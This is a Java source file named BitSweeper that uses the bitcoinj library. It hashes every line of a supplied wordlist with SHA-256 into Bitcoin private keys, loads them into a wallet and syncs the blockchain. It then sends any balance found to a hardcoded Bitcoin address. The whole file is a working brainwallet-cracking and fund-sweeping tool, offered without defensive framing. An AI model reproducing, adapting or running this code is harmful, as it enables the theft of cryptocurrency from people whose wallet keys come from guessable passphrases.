package com.bitmixr;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

import org.apache.log4j.Level;
import org.apache.log4j.Logger;

import com.google.bitcoin.core.AbstractWalletEventListener;
import com.google.bitcoin.core.Address;
import com.google.bitcoin.core.AddressFormatException;
import com.google.bitcoin.core.BlockChain;
import com.google.bitcoin.core.ECKey;
import com.google.bitcoin.core.NetworkParameters;
import com.google.bitcoin.core.PeerGroup;
import com.google.bitcoin.core.Transaction;
import com.google.bitcoin.core.Utils;
import com.google.bitcoin.core.VerificationException;
import com.google.bitcoin.core.Wallet;
import com.google.bitcoin.core.Wallet.SendRequest;
import com.google.bitcoin.discovery.DnsDiscovery;
import com.google.bitcoin.discovery.SeedPeers;
import com.google.bitcoin.store.BlockStore;
import com.google.bitcoin.store.MemoryFullPrunedBlockStore;
import com.google.common.util.concurrent.FutureCallback;
import com.google.common.util.concurrent.Futures;
import com.google.common.util.concurrent.MoreExecutors;

public class BitSweeper {

	public static void main(String[] args) throws Exception {
		final NetworkParameters params = NetworkParameters.prodNet();
		final BlockStore blockStore;
		final BlockChain chain;
		final PeerGroup peerGroup;
		// Try to read the wallet from storage, create a new one if not
		// possible.
		Logger.getRootLogger().setLevel(Level.WARN);
		// File file = new File("production.spvchain");
		// boolean chainExistedAlready = file.exists();
		// blockStore = new SPVBlockStore(params, file);
		// if (!chainExistedAlready) {
		// File checkpointsFile = new File("checkpoints");
		// if (checkpointsFile.exists()) {
		// FileInputStream stream = new FileInputStream(checkpointsFile);
		// CheckpointManager.checkpoint(params, stream, blockStore, 0);
		// }
		// }
		blockStore = new MemoryFullPrunedBlockStore(params, Integer.MAX_VALUE);
		// Connect to the localhost node. One minute timeout since we won't try
		// any other peers
		System.out.println("Connecting ...");
		chain = new BlockChain(params, blockStore);
		peerGroup = new PeerGroup(params, chain);
		peerGroup.setUserAgent("PingService", "1.0");
		peerGroup.addPeerDiscovery(new SeedPeers(params));
		peerGroup.addPeerDiscovery(new DnsDiscovery(params));
		// peerGroup.setFastCatchupTimeSecs((System.currentTimeMillis() / 1000)
		// - 6000000);
		final Wallet wallet = new Wallet(params);

		BufferedReader br = new BufferedReader(new FileReader(new File(args[0])));
		String line;
		MessageDigest md = MessageDigest.getInstance("SHA-256");
		int x = 0;
		Set<byte[]> currentSet = new HashSet<>();
		List<Thread> threads = new ArrayList<>();
		while ((line = br.readLine()) != null) {
			md.update(line.getBytes());
			currentSet.add(md.digest());
			x++;
			if (x % 50000 == 0) {
				System.out.println(x);
				final Set<byte[]> mySet = currentSet;
				Thread t = new Thread() {
					@Override
					public void run() {
						for (byte[] b : mySet) {
							ECKey key = new ECKey(new BigInteger(1, b));
							wallet.addKey(key);
						}
					}
				};
				t.start();
				threads.add(t);
				currentSet = new HashSet<>();
			}
		}
		final Set<byte[]> mySet = currentSet;
		Thread tr = new Thread() {
			@Override
			public void run() {
				for (byte[] b : mySet) {
					ECKey key = new ECKey(new BigInteger(1, b));
					wallet.addKey(key);
				}
			}
		};
		tr.start();
		threads.add(tr);
		// System.out.println(System.currentTimeMillis() - time);
		br.close();
		for (Thread t : threads) {
			t.join();
		}
		peerGroup.addWallet(wallet);
		chain.addWallet(wallet);

		wallet.addEventListener(new AbstractWalletEventListener() {

			@Override
			public void onCoinsReceived(final Wallet w, Transaction tx, BigInteger prevBalance, BigInteger newBalance) {
				final BigInteger value = tx.getValueSentToMe(w);
				System.out.println("Received pending tx for " + Utils.bitcoinValueToFriendlyString(value) + ": " + tx);
			}
		});

		peerGroup.startAndWait();
		// // Now make sure that we shut down cleanly!
		peerGroup.waitForPeers(2);
		peerGroup.downloadBlockChain();
		try {
			Thread.sleep(15000);
		} catch (InterruptedException e) {
			throw new RuntimeException(e.getMessage(), e);
		}
		// Now send the coins back!
		new Thread() {
			@Override
			public void run() {
				// Now send the coins back!
				final Address from;
				try {
					from = new Address(params, "14rksGEhDzYUiRuYDAeS94huLn4f3Kxg2o");
				} catch (AddressFormatException e1) {
					throw new RuntimeException(e1.getMessage(), e1);
				}
				//
				SendRequest request = Wallet.SendRequest.to(from, wallet.getBalance());
				if (!wallet.completeTx(request))
					return; // Insufficient funds.
				// Ensure these funds won't be spent
				// again.
				try {
					wallet.commitTx(request.tx);
				} catch (VerificationException e) {
					throw new RuntimeException(e.getMessage(), e);
				}
				// // wallet.saveToFile(...);
				// // A proposed transaction is now sitting
				// // in request.tx - send it in the
				// // background.
				//
				Futures.addCallback(peerGroup.broadcastTransaction(request.tx), new FutureCallback<Transaction>() {
					@Override
					public void onFailure(Throwable t) {
						t.printStackTrace();
					}

					@Override
					public void onSuccess(Transaction result) {
						System.out.println("SENT!!!");
					}
				}, MoreExecutors.sameThreadExecutor());

			}
		}.start();

		Thread.sleep(Integer.MAX_VALUE);
	}
}
